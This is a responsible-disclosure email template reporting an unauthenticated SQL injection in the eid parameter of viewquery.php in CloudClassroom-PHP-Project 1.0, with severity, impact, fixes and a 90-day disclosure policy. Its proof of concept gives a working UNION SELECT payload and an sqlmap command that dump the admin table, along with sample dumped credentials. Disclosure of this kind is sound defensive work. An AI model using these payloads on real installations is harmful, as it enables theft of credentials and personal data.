# Vendor Email Template — CloudClassroom-PHP-Project 1.0 — SQL Injection in viewquery.php (parameter eid)

**To:** Vishal Mathur (`mathurvishal`) — via repository private GitHub Security Advisory, or maintainer email contact
**From:** oliveira.luanalmeida@gmail.com
**Subject:** [Security] CloudClassroom-PHP-Project 1.0 — SQL Injection in viewquery.php (CVSS 9.1)

---

Dear Vishal Mathur,

My name is [Security Researcher] and I conduct responsible security research. During an
evaluation of the project **CloudClassroom-PHP-Project 1.0** (https://github.com/mathurvishal/CloudClassroom-PHP-Project), I identified a
**SQL Injection (UNION-based / error-based)** vulnerability that I would like to report coordinately, before any
public disclosure.

**Technical Summary**
- Affected Component: viewquery.php
- Parameter(s): eid (GET (+POST on UPDATE))
- Class / CWE: SQL Injection (UNION-based / error-based) — CWE-89
- Severity: CVSS v3.1 9.1 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- Required Authentication: None (via Broken Access Control — item 00; design would require student session)

**Description**
Parameter `eid` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

**Proof of Concept (controlled lab environment)**
```
curl -s -G "http://192.168.95.131:9292/viewquery.php" \
  --data-urlencode "eid=' UNION SELECT concat(0x5b,Aid,0x3a,Apass,0x5d),2,3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/viewquery.php?eid=1" -p eid --batch --dump -T admin
```
Observed evidence:
```
[admin@ics.com:admin]
[vishu:vishu]
```

**Impact**
Arbitrary database read (C:H) — PII, plaintext passwords, admin credentials; write via UPDATE/POST sink (I:H); total chain compromise.

**Recommended Fix**
- Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries.
- Enforce type casting for numeric identifiers (`(int)$id`) and use allowlist where applicable.
- Do not echo `$sql`/`mysqli_error()` to client (remove error oracle).
- Apply `exit;` after session guard (see item 00).

**Coordinated Disclosure**
I follow a 90-day responsible disclosure policy. I am available to clarify details,
provide complete PoC and validate the fix. I intend to request a CVE for this issue; if you prefer
to coordinate attribution, please let me know.

Awaiting your response and thank you for your attention.

Sincerely,
Luan Oliveira Ferreira de Almeida
oliveira.luanalmeida@gmail.com
